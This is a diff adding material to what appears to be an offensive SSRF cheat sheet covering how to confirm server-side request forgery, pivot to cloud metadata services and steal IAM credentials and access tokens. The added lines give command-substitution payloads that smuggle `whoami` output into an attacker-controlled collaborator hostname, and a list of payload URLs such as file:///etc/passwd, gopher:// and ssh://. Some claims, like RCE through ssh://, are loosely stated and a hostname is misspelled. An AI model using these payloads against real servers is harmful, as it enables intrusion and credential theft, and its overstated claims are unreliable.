@@ -32,6 +32,9 @@ If you can make the vulnerable server request these, you can steal credentials.
    ```
    http://<your-collaborator>.burpcollaborator.net
    ```
+   eg: if you have a website like:http://example.burpcollaporator.net ⇒ you can make RCE like :<br>
+
+`http://`whoami`.example.burpcollaporator.net` OR `http://$(whoami).example.burpcollaporator.net`<br>
    If you see an HTTP/DNS hit, SSRF is confirmed.
 
 2. **Pivot to internal targets**  
@@ -44,9 +47,18 @@ If you can make the vulnerable server request these, you can steal credentials.
    http://metadata.google.internal/...
    ```
 
-3. **Grab sensitive data**  
+3. **Grab sensitive data**
    - AWS: IAM role creds, instance identity docs, hostnames.
    - GCP: Access tokens, SSH keys.
+   ### sensitive places for SSRF:
+
+- `?url=file:///etc/passwd`
+- `?url=gopher://`
+- `?url=ssh://` ⇒ RCE
+- `?url=dict://` (dictionary network protocol)
+- `?url=ftp://` (file transfer protocol)
+- `?url=ldap://` (lightweight directory access protocol)
+- `?url=tftp://`
 
 ---
 
